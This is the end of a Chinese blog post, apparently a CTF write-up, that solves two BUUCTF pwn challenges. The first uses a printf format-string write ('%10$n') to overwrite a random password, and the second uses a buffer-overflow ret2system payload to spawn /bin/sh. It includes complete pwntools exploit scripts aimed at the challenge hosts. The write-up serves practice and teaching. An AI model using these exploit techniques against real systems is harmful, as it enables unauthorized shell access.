+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v1</span><span class=p>;</span> <span class=c1>// eax
+</span></span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// eax
+</span></span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>fd</span><span class=p>;</span> <span class=c1>// [esp+0h] [ebp-84h]
+</span></span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>nptr</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span> <span class=c1>// [esp+4h] [ebp-80h] BYREF
+</span></span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span> <span class=c1>// [esp+14h] [ebp-70h] BYREF
+</span></span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v6</span><span class=p>;</span> <span class=c1>// [esp+78h] [ebp-Ch]
+</span></span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=o>*</span><span class=n>v7</span><span class=p>;</span> <span class=c1>// [esp+7Ch] [ebp-8h]
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=n>v7</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>a1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>v6</span> <span class=o>=</span> <span class=nf>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>v1</span> <span class=o>=</span> <span class=nf>time</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>srand</span><span class=p>(</span><span class=n>v1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/dev/urandom&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>dword_804C044</span><span class=p>,</span> <span class=mi>4u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;your name:&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mh>0x63u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Hello,&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;your passwd:&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>nptr</span><span class=p>,</span> <span class=mh>0xFu</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>nptr</span><span class=p>)</span> <span class=o>==</span> <span class=n>dword_804C044</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;ok!!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>else</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;fail&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=nf>__readgsdword</span><span class=p>(</span><span class=mh>0x14u</span><span class=p>)</span> <span class=o>!=</span> <span class=n>v6</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nf>sub_80493D0</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>注意到<code>printf(buf);</code>，直接输出用户输入内容，这里是一个<strong>字符串格式化漏洞</strong>：</p><p><a class=link href=https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/ target=_blank rel=noopener>CTF Wiki - Format String</a></p><p><a class=link href=https://www.freebuf.com/geek/391911.html target=_blank rel=noopener>PWN学习之格式化字符串及CTF常见利用手法</a></p><p>当程序使用 <code>printf(user_input)</code> 时，如果用户输入包含格式化字符（如 <code>%s</code>, <code>%x</code>, <code>%n</code>），会触发以下风险：</p><ul><li><p><code>%s</code>：读取任意地址数据</p></li><li><p><code>%x</code>：泄漏栈数据</p></li><li><p><code>%n</code>：向任意地址写入数据（写入已输出的字符数）</p></li></ul><p>用<code>netcat</code>连一下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc node5.buuoj.cn <span class=m>26814</span>
+</span></span></code></pre></td></tr></table></div></div><p>输入<code>AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p</code>，获取printf栈上14个参数：</p><p>| 返回地址 | 旧ebp | 格式化字符串指针 | [参数1] | [参数2] | &mldr; |</p><p>也就是输入的内容buf指针往后14个参数，得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Hello,AAAA.0xff94c828.0x63.(nil).0xff94c84e.0x3.0xc2.0xf7de691b.0xff94c84e.0xff94c94c.0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252eDR������your passwd:
+</span></span></code></pre></td></tr></table></div></div><p>注意到<code>0x41414141</code>出现在第10个，说明输入字符串的起始地址位于栈上指针后第10个参数的位置，因此可以使用 <code>%10$</code> 系列格式化符来访问和操作这个位置。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;node5.buuoj.cn&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>29393</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># p = process(&#39;./pwn&#39;)</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># rand_address_start = 0x804C044</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x804C044</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;%10$n&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;your name:&#39;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>rec_data</span> <span class=o>=</span> <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;your passwd:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>32位，所以长度是4，原理就是：</p><p>随机数生成在<code>0x804C044</code>，所以直接向这个地址写入，就可以覆盖这个随机数：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x804C044</span><span class=p>)</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;%10$n&#39;</span> <span class=c1># 向第10个位置写入4</span>
+</span></span></code></pre></td></tr></table></div></div><p>然后发送4就得到flag了qwq</p><h2 id=jarvisoj_level2>jarvisoj_level2</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/home/wuko233/Projects/pwn/jarvisoj_level2/level2&#39;</span>
+</span></span><span class=line><span class=cl>    Arch:       i386-32-little
+</span></span><span class=line><span class=cl>    RELRO:      Partial RELRO
+</span></span><span class=line><span class=cl>    Stack:      No canary found
+</span></span><span class=line><span class=cl>    NX:         NX enabled
+</span></span><span class=line><span class=cl>    PIE:        No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
+</span></span><span class=line><span class=cl>    Stripped:   No
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>ssize_t</span> <span class=nf>vulnerable_function</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>136</span><span class=p>];</span> <span class=c1>// [esp+0h] [ebp-88h] BYREF
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=nf>system</span><span class=p>(</span><span class=s>&#34;echo Input:&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>256u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>读256，但是缓冲区只有136，同时居然还用着system()&mldr;</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>.</span><span class=n>plt</span><span class=p>:</span><span class=mi>08048320</span> <span class=p>;</span> <span class=ne>int</span> <span class=n>system</span><span class=p>(</span><span class=k>const</span> <span class=n>char</span> <span class=o>*</span><span class=n>command</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>和<a class=link href=#jarvisoj_level0-read>jarvisoj_level0</a>一样，read()漏洞。</p><p>shellcode在<code>0804A024</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>.data:0804A024 hint            db &#39;/bin/sh&#39;,0
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;node5.buuoj.cn&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>26567</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>136</span> <span class=o>+</span> <span class=mi>4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x8048320</span><span class=p>)</span> <span class=c1># _system()</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x804A024</span><span class=p>)</span> <span class=c1># str: bin/sh</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Input:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>利用system函数执行bin/sh，其中0是指定的system()的返回地址，因为要进shell，注定不会返回，所以可以瞎写一串数字，后接传入的参数。</p><hr></section><footer class=article-footer><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/posts/2025/06/11/checksecinstalldiff.html/><div class=article-image><img src=/posts/2025/06/11/checksecinstalldiff.html/cover.0b47bec42efd62326522dcceec7c0c9f_hu_307eb29a98e42e9d.jpg width=250 height=150 loading=lazy alt="Featured image of post checksec横表格不显示架构(arch)问题解决（不同版本安装）" data-key=checksecInstallDiff data-hash="md5-C0e+xC79YjJlItzO7HwMnw=="></div><div class=article-details><h2 class=article-title>checksec横表格不显示架构(arch)问题解决（不同版本安装）</h2></div></a></article><article class=has-image><a href=/posts/2024/11/26/letzreverseit.html/><div class=article-image><img src=/posts/2024/11/26/letzreverseit.html/cover.a51f3d55c8b87ae1eb798ae35be43a02_hu_ea91b000f79a27e4.jpg width=250 height=150 loading=lazy alt="Featured image of post ctf reverse解题+学习" data-key=letzreverseit data-hash="md5-pR89Vci4euHreYrjW+Q6Ag=="></div><div class=article-details><h2 class=article-title>ctf reverse解题+学习</h2></div></a></article><article class=has-image><a href=/posts/2024/11/20/ms08-067review-atk.html/><div class=article-image><img src=/posts/2024/11/20/ms08-067review-atk.html/done.2c98c6fe9545be9398f9dacf51ac2466_hu_729a64e7dfa7860e.png width=250 height=150 loading=lazy alt="Featured image of post 【漏洞】windows漏洞MS08-067复现与攻击" data-key=ms08-067review-atk data-hash="md5-LJjG/pVFvpOY+drPUawkZg=="></div><div class=article-details><h2 class=article-title>【漏洞】windows漏洞MS08-067复现与攻击</h2></div></a></article><article class=has-image><a href=/posts/2024/11/14/web-ctf.html/><div class=article-image><img src=/posts/2024/11/14/web-ctf.html/cover.caaa69c4cd00b265033fd3c5ceb4e8e7_hu_ac0666ffa70324c1.png width=250 height=150 loading=lazy alt="Featured image of post 【归档】ctf web类解密" data-key=web-ctf data-hash="md5-yqppxM0AsmUDP9PFzrTo5w=="></div><div class=article-details><h2 class=article-title>【归档】ctf web类解密</h2></div></a></article><article class=has-image><a href=/posts/2024/10/31/buuctf-misc.html/><div class=article-image><img src=/posts/2024/10/31/buuctf-misc.html/cover.84ba7b145c4f34398a249d691706685d_hu_edc9e71b4c32ad6.png width=250 height=150 loading=lazy alt="Featured image of post 【归档】杂项misc解密记录" data-key=buuctf-misc data-hash="md5-hLp7FFxPNDmKJJ1pFwZoXQ=="></div><div class=article-details><h2 class=article-title>【归档】杂项misc解密记录</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=wuko233/wuko233.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDAxMzU0ODE=" data-category=Announcements data-category-id=DIC_kwDOF9mVOc4CnNtv data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light_high_contrast data-lang=en data-loading crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light_high_contrast":"noborder_dark")}})()</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2026 wuko's blog</section><section class=powerby>本站总访问量<span id=busuanzi_value_site_pv>0</span>次<br><a href="https://icp.gov.moe/?keyword=20220237" target=_blank>萌ICP备20220237号</a><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script><br>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
